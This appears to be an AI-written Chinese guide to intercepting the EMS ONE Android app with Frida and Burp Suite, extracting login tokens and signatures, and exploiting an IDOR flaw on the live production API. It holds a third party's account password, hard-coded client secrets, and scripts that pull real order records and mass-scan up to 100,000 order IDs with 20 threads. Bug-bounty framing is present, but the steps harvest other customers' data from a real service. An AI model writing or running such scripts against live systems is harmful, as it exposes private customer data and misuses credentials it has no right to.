# Android环境搭建 - EMSONE Token提取指南

## 目标
提取com.ems.emsone的有效Token和RSA签名，验证IDOR漏洞

## 预计时间
2-4小时（首次搭建）

---

## 方法1：Genymotion（推荐）

### 1.1 安装Genymotion

```bash
# 下载Genymotion
wget https://dl.genymotion.com/releases/genymotion-3.6.0/genymotion-3.6.0-linux_x64.bin

# 赋予执行权限
chmod +x genymotion-3.6.0-linux_x64.bin

# 安装（需要VirtualBox）
sudo apt install -y virtualbox
./genymotion-3.6.0-linux_x64.bin

# 启动
~/genymotion/genymotion
```

### 1.2 创建虚拟设备

```
1. 打开Genymotion
2. 点击 "+" 添加新设备
3. 选择: Google Pixel 3 XL - Android 10.0
4. 下载并安装
5. 启动设备
```

### 1.3 安装APK

```bash
# 拖拽安装或使用adb
adb install /workspace/emsone_extracted/com.ems.emsone.apk

# 验证安装
adb shell pm list packages | grep ems
# 应该看到: package:com.ems.emsone
```

---

## 方法2：Android Studio AVD

### 2.1 安装Android Studio

```bash
# 下载
wget https://redirector.gvt1.com/edgedl/android/studio/ide-zips/2023.x.x.x/android-studio-2023.x.x.x-linux.tar.gz

# 解压
tar -xzf android-studio-*.tar.gz

# 启动
cd android-studio/bin
./studio.sh
```

### 2.2 创建AVD

```
1. Tools → AVD Manager
2. Create Virtual Device
3. 选择: Pixel 3 XL
4. 下载: Android 10 (Q) system image
5. Finish
6. 启动模拟器
```

---

## 步骤1：安装Frida

### 1.1 安装Frida CLI（本地机器）

```bash
pip3 install frida-tools
frida --version  # 验证
```

### 1.2 下载Frida Server（与设备架构匹配）

```bash
# 检查设备架构
adb shell getprop ro.product.cpu.abi
# 输出: x86_64 或 arm64-v8a

# 下载对应版本
# 从 https://github.com/frida/frida/releases
wget https://github.com/frida/frida/releases/download/16.1.10/frida-server-16.1.10-android-x86_64.xz

# 解压
unxz frida-server-16.1.10-android-x86_64.xz
mv frida-server-16.1.10-android-x86_64 frida-server
```

### 1.3 上传并运行Frida Server

```bash
# 上传到设备
adb push frida-server /data/local/tmp/

# 赋予执行权限
adb shell "chmod 755 /data/local/tmp/frida-server"

# 以root权限运行（在模拟器中）
adb shell "su -c /data/local/tmp/frida-server &"

# 验证Frida运行
frida-ps -U
# 应该看到进程列表
```

---

## 步骤2：配置Burp Suite（可选，用于抓包）

### 2.1 导出Burp CA证书

```
1. 打开Burp Suite → Proxy → Options
2. Import/Export CA Certificate
3. 导出为 burp_ca.der
4. 转换为.crt格式:
   openssl x509 -inform DER -in burp_ca.der -out burp_ca.crt
```

### 2.2 安装证书到Android设备

```bash
# 重命名证书（Android要求）
HASH=$(openssl x509 -inform PEM -subject_hash_old -in burp_ca.crt | head -1)
cp burp_ca.crt $HASH.0

# 推送到系统证书目录
adb root
adb remount
adb push $HASH.0 /system/etc/security/cacerts/
adb shell chmod 644 /system/etc/security/cacerts/$HASH.0
adb reboot

# 重启后验证
adb shell ls /system/etc/security/cacerts/ | grep $HASH
```

### 2.3 配置代理

```
1. 设备设置 → 网络 → Wi-Fi
2. 长按已连接的网络 → 修改网络
3. 高级选项 → 代理: 手动
4. 主机名: 192.168.x.x (你的电脑IP)
5. 端口: 8080
6. 保存
```

---

## 步骤3：使用Frida Hook提取Token

### 3.1 运行Hook脚本

```bash
# 启动APP并自动Hook
frida -U -f com.ems.emsone -l /workspace/frida_hook_emsone.js --no-pause

# 如果APP已经运行
frida -U com.ems.emsone -l /workspace/frida_hook_emsone.js
```

### 3.2 在APP中登录

```
1. 打开EMS ONE APP
2. 尝试登录:
   - 用difoco账号: difoco / 43824893
   - 或注册新账号（如果可行）
   
3. 观察Frida输出:
   [+] Token Extracted!
   eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
   
4. Token将自动保存到: /sdcard/emsone_tokens.txt
```

### 3.3 提取保存的Token

```bash
# 从设备拉取文件
adb pull /sdcard/emsone_tokens.txt /workspace/

# 查看
cat /workspace/emsone_tokens.txt
```

---

## 步骤4：验证Token有效性

### 4.1 使用提取的Token测试API

```bash
cd /workspace
python3 << 'PYEOF'
import requests
import json
import urllib3
urllib3.disable_warnings()

# 从文件读取Token
with open('emsone_tokens.txt', 'r') as f:
    content = f.read()
    # 提取Token（假设格式为 "Token: xxx"）
    token = content.split('Token:')[1].split('\n')[0].strip()

print(f"[*] Testing Token: {token[:50]}...")

# 构造请求
headers = {
    'X-Client-ID': 'android_app_987654',
    'X-Client-Secret': 'android_s3cr3t_uvwxzy',
    'Authorization': f'Bearer {token}',
    'Content-Type': 'application/json',
}

data = {
    "channel": "ANDROID",
    "code": "ORDER_GET_BY_ID",
    "data": json.dumps({"orderId": "1"}),
    "signature": ""  # 暂时忽略签名
}

r = requests.post(
    'https://gwmobile.emsone.com.vn/execute',
    json=data,
    headers=headers,
    verify=False
)

print(f"\n[Response]")
print(json.dumps(r.json(), indent=2, ensure_ascii=False))

if r.json().get('Code') != '97':
    print("\n✅ Token有效！可以进行IDOR测试")
else:
    print("\n⚠️ 仍需RSA签名")

PYEOF
```

---

## 步骤5：IDOR漏洞验证

### 5.1 单个订单测试

```python
python3 << 'PYEOF'
import requests
import json

token = "YOUR_EXTRACTED_TOKEN"
signature = "YOUR_RSA_SIGNATURE"  # 从Frida输出提取

headers = {
    'X-Client-ID': 'android_app_987654',
    'X-Client-Secret': 'android_s3cr3t_uvwxzy',
    'Authorization': f'Bearer {token}',
    'signature': signature,
    'public_key': 'YOUR_PUBLIC_KEY',
    # ... 其他headers
}

# 测试多个订单ID
for order_id in [1, 2, 3, 100, 1000, 10000]:
    data = {
        "channel": "ANDROID",
        "code": "ORDER_GET_BY_ID",
        "data": json.dumps({"orderId": str(order_id)}),
        "signature": ""
    }
    
    r = requests.post(
        'https://gwmobile.emsone.com.vn/execute',
        json=data,
        headers=headers,
        verify=False
    )
    
    result = r.json()
    
    if result.get('Code') == '00':
        print(f"✅ 订单{order_id}可访问！")
        print(json.dumps(result, indent=2, ensure_ascii=False))
    else:
        print(f"❌ 订单{order_id}: {result.get('Message')}")

PYEOF
```

### 5.2 大规模IDOR扫描

```bash
# 如果Token+签名有效，使用自动化工具
python3 /workspace/merchant_idor_massive.py \
    --token "YOUR_TOKEN" \
    --start-id 1 \
    --end-id 100000 \
    --threads 20
```

---

## 故障排除

### 问题1：Frida连接失败

```bash
# 检查frida-server是否运行
adb shell ps | grep frida

# 如果没有，重新启动
adb shell "su -c /data/local/tmp/frida-server &"

# 检查端口
adb forward tcp:27042 tcp:27042
```

### 问题2：APP闪退

```
可能是root检测，尝试：
1. 使用Magisk Hide隐藏root
2. 使用Frida的spawn模式
3. Hook root检测函数
```

### 问题3：无法登录

```
尝试：
1. 使用difoco商户账号
2. 检查网络连接
3. 在Burp中查看实际的登录请求
4. 可能需要正确的RSA签名
```

---

## 预期结果

### 成功标志

```
✅ Token已提取
✅ RSA签名已记录
✅ Public Key已获取
✅ 完整的HTTP请求已捕获

文件：
- /sdcard/emsone_tokens.txt  (设备上)
- /workspace/emsone_tokens.txt (本地)
- Burp Suite历史记录 (如使用)
```

### 如果成功获取Token

```
1. 立即测试IDOR漏洞
2. 记录所有可访问的订单
3. 截图作为证据
4. 更新漏洞报告
5. 提交完整发现
```

---

## 时间估算

```
环境搭建 (首次):         1-2小时
Frida配置:              30分钟
Token提取:              30分钟
IDOR验证:               1小时
报告更新:               30分钟

总计: 3.5-4.5小时
```

---

## 备选方案

如果Android环境搭建困难：

1. **使用真实Android设备**
   - 更容易安装
   - 性能更好
   - 需要root权限

2. **联系EMS Vietnam**
   - 请求测试账号
   - 作为负责任披露的一部分

3. **先提交已有漏洞**
   - 商户系统漏洞已完整验证
   - 可立即获得赏金
   - 之后再补充EMSONE发现

---

**下一步行动？**

A. 立即搭建Android环境  
B. 先提交商户系统漏洞  
C. 需要更详细的指导  
D. 其他想法
